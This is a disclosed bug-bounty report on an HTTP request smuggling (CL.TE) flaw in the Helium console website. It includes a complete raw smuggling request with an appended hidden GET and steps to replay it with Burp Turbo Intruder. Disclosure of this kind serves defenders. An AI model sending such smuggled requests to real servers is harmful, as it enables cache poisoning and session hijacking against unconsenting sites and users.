# HTTP request Smuggling

## Report Details
- **Report ID**: 867952
- **URL**: https://hackerone.com/reports/867952
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-07T10:07:59.993Z
- **Disclosed**: 2020-07-02T05:43:30.090Z

## Reporter
- **Username**: dracomalfoy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: helium

## Vulnerability Information
When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to "smuggle" a request to one device without the other device being aware of it. 

console.helium.com s vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.

##Products affected:

Helium console Website. :  console.helium.com

##Steps To Reproduce:

1. Run the burp suite turbo intruder on the following request

```

POST /api/sessions HTTP/1.1
Host: console.helium.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://console.helium.com/login
Content-Type: application/json
Content-Length: 109
DNT: 1
Connection: close
Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6ImJmZDVjNzFmLWVhMWUtNDlmZi1hZGYyLTNlYWY3OTBjNmU3YlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU4ODg0MDA3NzA2MiwibGFzdEV2ZW50VGltZSI6MTU4ODg0MTg5MDk3NiwiZXZlbnRJZCI6NywiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjl9
Transfer-Encoding: chunked

39
{"session":{"email":"fdsfsd@fgd.jk","password":"sdfsdf"}}
00

GET / HTTP/1.1
Host: www.helium.com
foo: x


```

2. Script for tubro Intruder is attached. Word list can be any list containing any characters.

3. Observe 200 Ok response for the /api/sessions post request which is supposed to give  401 Unauthorized   {"errors":{"error":["The email address or password you entered is not valid"]}} Please refer the attached screenshot ( Smuggle Request1.png ) which contain the expected response. 

4. This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). A recoding is attached as well.

Any suggestions or improvement in reports are welcome

## Impact

It is possible to smuggle the request and disrupt the user experience. Session Hijacking, Privilege Escalation and cache poisoning can be the impact of this vulnerability as well. Self-Xss can be escalated to XSS. It can be chained with other vulnerabilities to raise their severity.
As unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.

For more information about the vulnerability please refer :
https://cwe.mitre.org/data/definitions/444.html ;
https://capec.mitre.org/data/definitions/33.html

## Attachments
- intruder.txt
- Smuggle_Request1.png
- Final_Response..png
- helium_http_smuggling_.mp4
